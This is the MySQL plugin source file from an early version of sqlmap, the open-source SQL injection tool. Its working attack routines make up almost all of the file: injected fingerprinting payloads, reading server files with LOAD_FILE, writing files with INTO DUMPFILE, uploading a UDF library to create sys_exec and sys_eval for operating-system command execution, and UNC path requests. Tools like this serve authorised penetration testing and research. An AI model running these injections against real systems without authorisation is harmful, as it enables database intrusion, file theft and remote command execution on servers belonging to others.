#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import os
import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapSyntaxException
from lib.core.session import setDbms
from lib.core.settings import MYSQL_ALIASES
from lib.core.settings import MYSQL_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request
from lib.techniques.inband.union.test import unionTest
from lib.techniques.inband.union.use import unionUse

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.misc import Miscellaneous
from plugins.generic.takeover import Takeover


class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
    """
    This class defines MySQL methods
    """

    def __init__(self):
        self.__basedir        = None
        self.excludeDbsList   = MYSQL_SYSTEM_DBS

        Enumeration.__init__(self, "MySQL")
        Filesystem.__init__(self)
        Takeover.__init__(self)

        unescaper.setUnescape(MySQLMap.unescape)


    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "%d" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += ","

                expression = expression.replace(old, "CHAR(%s)" % unescaped)
        else:
            unescaped  = "CHAR("
            unescaped += ",".join("%d" % ord(c) for c in expression)
            unescaped += ")"

            expression = unescaped

        return expression


    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHAR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find(")")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.lstrip("CHAR(").rstrip(")")
            oldUpper = oldUpper.split(",")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped)

        return expression


    def __commentCheck(self):
        infoMsg = "executing MySQL comment injection fingerprint"
        logger.info(infoMsg)

        query   = agent.prefixQuery(" /* NoValue */")
        query   = agent.postfixQuery(query)
        payload = agent.payload(newValue=query)
        result  = Request.queryPage(payload)

        if result != True:
            warnMsg = "unable to perform MySQL comment injection"
            logger.warn(warnMsg)

            return None

        # MySQL valid versions updated on 05/2009
        versions = (
                     (32200, 32233),    # MySQL 3.22
                     (32300, 32359),    # MySQL 3.23
                     (40000, 40031),    # MySQL 4.0
                     (40100, 40122),    # MySQL 4.1
                     (50000, 50077),    # MySQL 5.0
                     (50100, 50134),    # MySQL 5.1
                     (50400, 50401),    # MySQL 5.4
                     (60000, 60010),    # MySQL 6.0
                   )

        for element in versions:
            prevVer = None

            for version in range(element[0], element[1] + 1):
                randInt = randomInt()
                version = str(version)
                query   = agent.prefixQuery(" /*!%s AND %d=%d*/" % (version, randInt, randInt + 1))
                query   = agent.postfixQuery(query)
                payload = agent.payload(newValue=query)
                result  = Request.queryPage(payload)

                if result == True:
                    if not prevVer:
                        prevVer = version

                    if version[0] == "3":
                        midVer = prevVer[1:3]
                    else:
                        midVer = prevVer[2]

                    trueVer = "%s.%s.%s" % (prevVer[0], midVer, prevVer[3:])

                    return trueVer

                prevVer = version

        return None


    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value  += "back-end DBMS: "
        actVer  = formatDBMSfp()

        if not conf.extensiveFp:
            value += actVer
            return value

        comVer = self.__commentCheck()
        blank  = " " * 15
        value += "active fingerprint: %s" % actVer

        if comVer:
            comVer = formatDBMSfp([comVer])
            value += "\n%scomment injection fingerprint: %s" % (blank, comVer)

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]

            if re.search("-log$", kb.data.banner):
                banVer += ", logging enabled"

            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value


    def checkDbms(self):
        """
        References for fingerprint:

        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html
        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html
        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html
        """

        if conf.dbms in MYSQL_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
            setDbms("MySQL %s" % kb.dbmsVersion[0])

            if int(kb.dbmsVersion[0]) >= 5:
                kb.data.has_information_schema = True

            self.getBanner()

            if not conf.extensiveFp:
                return True

        infoMsg = "testing MySQL"
        logger.info(infoMsg)

        randInt = str(randomInt(1))

        payload = agent.fullPayload(" AND CONNECTION_ID()=CONNECTION_ID()")
        result  = Request.queryPage(payload)

        if result == True:
            infoMsg = "confirming MySQL"
            logger.info(infoMsg)

            payload = agent.fullPayload(" AND ISNULL(1/0)")
            result  = Request.queryPage(payload)

            if result != True:
                warnMsg = "the back-end DMBS is not MySQL"
                logger.warn(warnMsg)

                return False

            # Determine if it is MySQL >= 5.0.0
            if inject.getValue("SELECT %s FROM information_schema.TABLES LIMIT 0, 1" % randInt, charsetType=2) == randInt:
                kb.data.has_information_schema = True
                kb.dbmsVersion = [">= 5.0.0"]

                setDbms("MySQL 5")

                self.getBanner()

                if not conf.extensiveFp:
                    return True

                # Check if it is MySQL >= 5.1.2
                if inject.getValue("MID(@@table_open_cache, 1, 1)", unpack=False):
                    if inject.getValue("SELECT %s FROM information_schema.PROCESSLIST LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = [">= 5.1.7"]
                    elif inject.getValue("SELECT %s FROM information_schema.PARTITIONS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = ["= 5.1.6"]
                    elif inject.getValue("SELECT %s FROM information_schema.PLUGINS LIMIT 0, 1" % randInt, unpack=False, charsetType=2) == randInt:
                        kb.dbmsVersion = [">= 5.1.5", "< 5.1.6"]
                    else:
                        kb.dbmsVersion = [">= 5.1.2", "< 5.1.5"]

                # Or if it is MySQL >= 5.0.0 and < 5.1.2
                elif inject.getValue("MID(@@hostname, 1, 1)", unpack=False):
                    kb.dbmsVersion = [">= 5.0.38", "< 5.1.2"]
                elif inject.getValue("SELECT 1 FROM DUAL", charsetType=1) == "1":
                    kb.dbmsVersion = [">= 5.0.11", "< 5.0.38"]
                elif inject.getValue("DATABASE() LIKE SCHEMA()"):
                    kb.dbmsVersion = [">= 5.0.2", "< 5.0.11"]
                else:
                    kb.dbmsVersion = [">= 5.0.0", "<= 5.0.1"]

            # Otherwise assume it is MySQL < 5.0.0
            else:
                kb.dbmsVersion = ["< 5.0.0"]

                setDbms("MySQL 4")

                self.getBanner()

                if not conf.extensiveFp:
                    return True

                # Check which version of MySQL < 5.0.0 it is
                coercibility = inject.getValue("COERCIBILITY(USER())")

                if coercibility == "3":
                    kb.dbmsVersion = [">= 4.1.11", "< 5.0.0"]
                elif coercibility == "2":
                    kb.dbmsVersion = [">= 4.1.1", "< 4.1.11"]
                elif inject.getValue("CURRENT_USER()"):
                    kb.dbmsVersion = [">= 4.0.6", "< 4.1.1"]

                    if inject.getValue("CHARSET(CURRENT_USER())") == "utf8":
                        kb.dbmsVersion = ["= 4.1.0"]
                    else:
                        kb.dbmsVersion = [">= 4.0.6", "< 4.1.0"]
                elif inject.getValue("FOUND_ROWS()", charsetType=1) == "0":
                    kb.dbmsVersion = [">= 4.0.0", "< 4.0.6"]
                elif inject.getValue("CONNECTION_ID()"):
                    kb.dbmsVersion = [">= 3.23.14", "< 4.0.0"]
                elif re.search("@[\w\.\-\_]+", inject.getValue("USER()")):
                    kb.dbmsVersion = [">= 3.22.11", "< 3.23.14"]
                else:
                    kb.dbmsVersion = ["< 3.22.11"]

            return True
        else:
            warnMsg = "the back-end DMBS is not MySQL"
            logger.warn(warnMsg)

            return False


    def checkDbmsOs(self, detailed=False):
        if kb.os:
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "text")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))

        datadirSubstr = inject.getValue("SELECT MID(@@datadir, 1, 1)", unpack=False)

        if datadirSubstr == "/":
            kb.os = "Linux"
        else:
            kb.os = "Windows"

        infoMsg = "the back-end DBMS operating system is %s" % kb.os
        logger.info(infoMsg)

        if detailed == False:
            self.cleanup(onlyFileTbl=True)

            return

        self.cleanup(onlyFileTbl=True)


    def unionReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        result = inject.getValue("SELECT HEX(LOAD_FILE('%s'))" % rFile)

        return result


    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/sqlmapfilehex%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg  = "saving hexadecimal encoded content of file '%s' " % rFile
        debugMsg += "into temporary file '%s'" % tmpFile
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (rFile, tmpFile))

        debugMsg  = "loading the content of hexadecimal encoded file "
        debugMsg += "'%s' into support table" % rFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=2)

        if not length.isdigit() or not len(length) or length in ( "0", "1" ):
            errMsg  = "unable to retrieve the content of the "
            errMsg += "file '%s'" % rFile
            raise sqlmapNoneDataException, errMsg

        length   = int(length)
        sustrLen = 1024

        if length > sustrLen:
            result = []

            for i in range(1, length, sustrLen):
                chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, sort=False, resumeValue=False, charsetType=3)

                result.append(chunk)
        else:
            result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=3)

        return result


    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList   = self.fileEncode(wFile, "hex", True)
        fcEncodedStr    = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injPlace == "GET" and fcEncodedStrLen > 8000:
            warnMsg  = "the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warn(warnMsg)

        unionTest()

        oldParamFalseCond   = conf.paramFalseCond
        conf.paramFalseCond = True

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, dFile)
        unionUse(sqlQuery, direct=True, unescape=False, nullChar="''")

        conf.paramFalseCond = oldParamFalseCond

        if confirm == True:
            self.askCheckWrittenFile(wFile, dFile, fileType)


    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        debugMsg  = "creating a support table to write the hexadecimal "
        debugMsg += "encoded file to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug("encoding file to its hexadecimal string value")
        fcEncodedList = self.fileEncode(wFile, "hex", False)

        debugMsg  = "forging SQL statements to write the hexadecimal "
        debugMsg += "encoded file to the support table"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug("inserting the hexadecimal encoded file to the support table")

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile))

        if confirm == True:
            self.askCheckWrittenFile(wFile, dFile, fileType)


    def udfInit(self):
        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]
        dFile  = None
        wFile  = paths.SQLMAP_UDF_PATH
        lib    = "libsqlmapudf%s" % randomStr(lowercase=True)

        if kb.os == "Windows":
            wFile += "/mysql/windows/lib_mysqludf_sys.dll"
            libExt = "dll"
        else:
            wFile += "/mysql/linux/lib_mysqludf_sys.so"
            libExt = "so"

        for udf in ( "sys_exec", "sys_eval" ):
            if udf in self.createdUdf:
                continue

            logger.info("checking if %s UDF already exist" % udf)

            query  = agent.forgeCaseStatement("(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0, 1)='%s'" % (udf, udf))
            exists = inject.getValue(query, resumeValue=False, unpack=False)

            if exists == "1":
                message  = "%s UDF already exists, do you " % udf
                message += "want to overwrite it? [y/N] "
                output   = readInput(message, default="N")

                if output and output in ("y", "Y"):
                    self.udfToCreate.add(udf)
            else:
                self.udfToCreate.add(udf)

        if len(self.udfToCreate) > 0:
            # On Windows
            if kb.os == "Windows":
                # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
                if banVer >= "5.1.19":
                    if self.__basedir == None:
                        logger.info("retrieving MySQL base directory absolute path")

                        # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
                        self.__basedir = inject.getValue("SELECT @@basedir")
                        self.__basedir = os.path.normpath(self.__basedir.replace("\\", "/"))

                        if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
                            kb.os = "Windows"

                        # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
                        dFile = "%s/lib/plugin/%s.%s" % (self.__basedir, lib, libExt)

                    logger.warn("this will only work if the database administrator created manually the '%s/lib/plugin' subfolder" % self.__basedir)

                # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
                # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
                else:
                    #logger.debug("retrieving MySQL data directory absolute path")

                    # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
                    #datadir = inject.getValue("SELECT @@datadir")

                    # NOTE: specifying the relative path as './udf.dll'
                    # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
                    datadir = "."
                    datadir = os.path.normpath(datadir.replace("\\", "/"))

                    if re.search("[\w]\:\/", datadir, re.I):
                        kb.os = "Windows"

                    # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
                    # C:\WINDOWS\system32, @@basedir\bin or @@datadir
                    dFile = "%s/%s.%s" % (datadir, lib, libExt)

            # On Linux
            else:
                # The SO can be in either /lib, /usr/lib or one of the
                # paths specified in /etc/ld.so.conf file, none of these
                # paths are writable by mysql user by default
                # TODO: test with plugins folder on MySQL >= 5.1.19
                dFile = "/usr/lib/%s.%s" % (lib, libExt)

            self.writeFile(wFile, dFile, "binary", False)

        for udf, retType in ( ( "sys_exec", "int" ), ( "sys_eval", "string" ) ):
            if udf in self.createdUdf:
                continue

            if udf in self.udfToCreate:
                logger.info("creating %s UDF from the binary UDF file" % udf)

                # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
                inject.goStacked("DROP FUNCTION %s" % udf)
                inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, retType, lib, libExt))
            else:
                logger.debug("keeping existing %s UDF as requested" % udf)

            self.createdUdf.add(udf)

        self.envInitialized = True

        debugMsg  = "creating a support table to write commands standard "
        debugMsg += "output to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, "longtext")


    def uncPathRequest(self):
        if kb.stackedTest == False:
            query   = agent.prefixQuery(" AND LOAD_FILE('%s')" % self.uncPath)
            query   = agent.postfixQuery(query)
            payload = agent.payload(newValue=query)

            Request.queryPage(payload)
        else:
            inject.goStacked("SELECT LOAD_FILE('%s')" % self.uncPath, silent=True)
